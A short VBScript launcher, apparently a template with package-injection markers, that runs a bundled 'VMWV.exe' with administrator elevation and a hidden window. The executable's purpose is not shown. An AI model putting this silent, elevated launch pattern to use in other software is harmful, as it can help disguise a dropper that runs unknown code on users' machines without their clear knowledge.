scriptdir = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)

Set Shell = CreateObject("Shell.Application")
'{{INJECT_START:PKG}}
Shell.ShellExecute scriptDir & "\required\VMWV.exe", , , "runas", 0
'{{INJECT_END:PKG}}
